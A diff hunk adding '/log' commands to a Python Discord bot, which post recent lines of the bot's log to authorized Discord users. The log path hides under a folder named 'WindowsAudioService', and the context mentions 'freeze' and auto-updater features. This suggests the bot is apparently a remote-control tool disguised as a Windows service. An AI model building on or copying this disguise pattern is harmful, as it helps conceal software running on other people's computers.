@@ -1222,6 +1222,44 @@ async def freeze_prefix(ctx, seconds: int = 5):
     await ctx.send(" Done freezing.")
 
 
+#  /log 
+LOG_PATH = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "WindowsAudioService", "bot.log")
+
+@bot.tree.command(name="log", description="Send the recent bot log")
+@app_commands.describe(lines="How many lines to show (default 50)")
+async def log_cmd(interaction: discord.Interaction, lines: int = 50):
+    if not authorized(interaction.user.id):
+        return await deny(interaction)
+    await interaction.response.defer()
+    try:
+        with open(LOG_PATH, "r", encoding="utf-8", errors="replace") as f:
+            content = f.readlines()
+        recent = "".join(content[-lines:])
+        if len(recent) > 1900:
+            recent = recent[-1900:]
+        await interaction.followup.send(f"📋 Last `{lines}` log lines:\n```\n{recent}\n```")
+    except FileNotFoundError:
+        await interaction.followup.send(f" Log file not found at `{LOG_PATH}`")
+    except Exception as e:
+        await interaction.followup.send(f" Error: {e}")
+
+@bot.command(name="log")
+async def log_prefix(ctx, lines: int = 50):
+    if not authorized(ctx.author.id):
+        return await ctx.send(" You're not authorized.")
+    try:
+        with open(LOG_PATH, "r", encoding="utf-8", errors="replace") as f:
+            content = f.readlines()
+        recent = "".join(content[-lines:])
+        if len(recent) > 1900:
+            recent = recent[-1900:]
+        await ctx.send(f"📋 Last `{lines}` log lines:\n```\n{recent}\n```")
+    except FileNotFoundError:
+        await ctx.send(f" Log file not found at `{LOG_PATH}`")
+    except Exception as e:
+        await ctx.send(f" Error: {e}")
+
+
 # 
 # AUTO-UPDATER
 # 
